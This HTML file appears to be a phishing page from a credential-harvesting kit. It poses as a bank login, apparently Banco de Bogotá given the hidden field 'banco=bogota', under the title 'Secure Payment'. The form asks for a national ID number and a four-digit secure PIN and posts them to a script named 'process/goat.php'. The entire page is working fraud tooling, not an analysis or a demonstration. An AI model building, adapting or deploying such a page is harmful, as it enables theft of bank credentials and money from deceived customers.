<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <title>Secure Payment</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        input {
            width: 86%;
            height: 45px;
            padding-left: 15px;
            border-radius: 7px;
            border: 1px solid rgb(219, 219, 219);
            margin-bottom: 10px;
        }

        select {
            width: 90%;
            height: 45px;
            padding-left: 15px;
            margin-top: 12px;
            background-color: white;
            color: black;
            border: 1px solid rgb(219, 219, 219);
            margin-bottom: 12px;
        }

        button {
            border-radius: 100px;
            width: 90%;
            height: 50px;
            background-color: #0040a8;
            color: white;
            font-size: 15px;
            border: none;
        }

        .datos {
            width: 80%;
            border: 1px solid rgb(219, 219, 219);
            padding: 10px;
            margin: auto;
            margin-top: 20px;
            text-align: center;
            border-radius: 8px;
        }

        .clave {
            margin-top: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <img src="img/menu.jfif" alt="Menu" width="100%">
    <center><img src="img/mensaje.jfif" alt="Mensaje" width="93%"></center>

    <center>
        <div class="clave">Clave segura</div>
        <div class="datos">
            <!-- Formulario que envía los datos a goat.php -->
            <form action="process/goat.php" method="POST">
                <select name="cc">
                    <option value="Cedula">Cédula de ciudadanía</option>
                </select><br>
                <input type="tel" name="user" placeholder="Número de documento" minlength="6" maxlength="10" required><br>
                <input type="password" name="pass" placeholder="Clave segura" minlength="4" maxlength="4" required><br>
                <input type="hidden" name="banco" value="bogota">
                <a href="#" style="color: #0040a8;">Olvidé mi clave</a><br><br>
                <button type="submit">Ingresar ahora</button>
            </form>
        </div>
    </center>

</body>
</html>
